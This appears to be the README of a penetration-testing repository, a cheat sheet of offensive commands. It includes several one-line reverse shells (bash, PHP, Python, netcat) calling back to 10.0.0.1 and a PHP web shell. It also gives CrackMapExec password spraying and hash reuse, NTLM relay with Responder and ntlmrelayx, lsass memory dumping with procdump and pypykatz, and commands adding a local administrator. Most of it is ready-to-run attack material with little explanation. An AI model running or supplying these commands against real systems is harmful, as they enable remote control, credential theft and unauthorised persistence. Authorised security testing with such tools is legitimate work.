# This repository is a collection of tools and tricks to help you as test guide.

### Nmap scripts searcher
```bash
> git clone https://github.com/sknux/pentest_scripts
> cd pentest_scripts
> chmod +x nmap_script_searcher.sh
> ./nmap_script_searcher.sh
```

### SCP Transfer File
```bash
> scp $1 $2 $3@$4:$5 //Transfer a file
> scp -r $1 $2 $3@$4:$5 //Transfer a entire path
```

### SSH Tunneling
```bash
> ssh user@remote_host -L 8080:specific_ip_address:3000
```

### Python Interactive SHELL
```bash
> python -c 'import pty; pty.spawn("/bin/bash")'
```

### Simple Reverse SHELLs
```bash
> <?php system($_GET['cmd']);?> //PHPWebShell
> php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' //PHPReverseShell
> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
> nc 127.0.0.1 1337 -e /bin/bash
```

### CrackMapExec Utilities
```bash
> cme smb 172.0.5.0/24 //Enumeration
> cme smb 172.0.5.0/24 --gen-relay-list hosts.txt //Generate the targets apparently vulnerable to ntlmrelay attack
> cme smb 172.0.5.0/24 -u list.txt -p 'p@ssw0rd!!' //Password Spray
> cme smb 172.0.5.0/24 -u user -H 'hashnt:lm' --local-auth //ntlmhash reuse
> cme smb 172.0.5.0/24 -u user -H/-p 'hashnt:lm'/password --local-auth -x 'dir' //execute cmd.exe command
> cme smb 172.0.5.0/24 -u user -H/-p 'hashnt:lm'/password --local-auth --loggedon-users //identify users logged on the host
> cme smb 172.0.5.0/24 -u user -H/-p 'hashnt:lm'/password -M MODULE
```

### NTLM Relay Attack
```bash
=> In Responder.conf file, turn off the SMB and HTTP server.
> sudo responder -I eth0 -dwr
=> Execute the impacket-ntlmrelayx with the hosts obtained with the cme --gen-relay-list
> impacket-ntlmrelayx -tf hosts.txt -smb2support
=> And waiting for the interactions
```

### Some Executions of Procdump, PSExec and Net
```bash
=> Procdump:
> ./procdump64.exe -accepteula -ma lsass.exe local-dir (c://)
=> PSExec:
> ./psexec64.exe -s -i
=> Add a user to host
> net user USER PASSWORD /ADD
=> Add a user to group
> net localgroup administrators USER /ADD
```

### Pypykatz Utilities
```bash
=> Installation:
> pip3 install pypykatz
=> Procdump MiniDump:
> pypykatz lsa minidump file.dmp
```
### Linux Utilities
```bash
> msfconsole -q -x 'use $1; set RHOSTS $2;$3;exit'
> pspy64
> linpeas
```

### Windows Enumeration and Exploitation
```bash
> net user USER /domain
> Get-ADGroupMember -Identity 'Domain Admins/Enterprise Admins' -Recursive
=> Procdump MiniDump:
> pypykatz lsa minidump file.dmp
> \\http://live.sysinternals.com\tools\PsExec.exe -s -c cmd.exe
> net use z: https://live.sysinternals.com/tools && z:\PsExec.exe -s -c cmd.exe
$ https://wadcoms.github.io/
$ https://github.com/besimorhino/powercat
$ https://twitter.com/cyb3rops/status/1448291042604863491
$ https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
```

### Web Enumeration and Exploitation
```bash
$ https://github.com/portswigger/saml-raider //SSO Pentest
$ https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696 //GraphQL Pentest
$ https://github.com/doyensec/inql#:~:text=InQL%20Burp%20Suite%20Extension%20Since%20version%201.0.0%20of,the%20inql%20extension%20for%20Burp%20Suite%2C%20you%20can%3A //GraphQL Pentest
> Know about introspection and the difference between queries and mutations //GraphQL Pentest
```
